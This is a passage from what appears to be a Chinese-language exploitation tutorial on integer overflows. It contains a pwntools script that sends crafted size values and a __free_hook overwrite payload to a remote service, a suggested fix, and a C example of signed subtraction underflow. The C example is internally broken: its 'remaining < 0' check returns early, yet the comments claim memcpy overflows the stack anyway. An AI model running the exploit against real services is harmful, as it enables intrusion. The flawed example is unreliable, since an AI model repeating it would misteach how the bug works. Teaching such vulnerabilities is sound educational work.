from pwn import *

# 假设目标程序有漏洞，我们控制width和height
# 构造使得alloc_size = 0x20，data_size = 0x100
# 堆布局：先分配多个chunk，使目标chunk后紧邻__free_hook区域
payload = b"A" * 0x20 + p64(0xdeadbeef)  # 覆盖__free_hook
# 触发漏洞
r = remote("target", 1337)
r.sendlineafter("> ", f"{0x10001} {0x10001}".encode())
r.sendafter("data: ", payload)
r.interactive()


**修复**：使用`calloc`（自动检查溢出）或`size_t`类型并添加`if (a > SIZE_MAX / b)`检查。

有符号整数溢出在减法中常见于计算剩余空间或偏移时。例如，`remaining = total - used`，若total和used均为有符号整数，且used大于total，则结果为负数。该负数随后被用作长度参数传递给memcpy或作为循环计数，导致栈溢出。

**漏洞原理**：假设有一个固定大小的栈缓冲区，程序先写入一些数据，然后计算剩余空间：`int remaining = BUFSIZE - offset;`，其中offset由用户控制。若offset > BUFSIZE，则remaining为负数。随后`memcpy(buffer + offset, src, remaining)`，memcpy的第三个参数是size_t，负数转为巨大正数，导致大量数据复制到栈上，覆盖返回地址。

**C代码示例**：
c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BUFSIZE 64

void vulnerable(char *input, int offset) {
    char buffer[BUFSIZE];
    int remaining = BUFSIZE - offset;  // 有符号减法，可能溢出为负
    if (remaining < 0) {
        printf("Error\n");
        return;
    }
    // 错误：remaining为int，memcpy期望size_t，若remaining为负，转换后巨大
    memcpy(buffer + offset, input, remaining);
}

int main() {
    char payload[1024];
    memset(payload, 'A', 1024);
    vulnerable(payload, 100);  // offset=100 > 64，remaining=-36，memcpy复制0xFFFFFFDC字节，栈溢出
    return 0;
}


**利用pwntools**：攻击者控制offset为大于BUFSIZE的值，使remaining为负数，memcpy复制大量数据，覆盖返回地址。
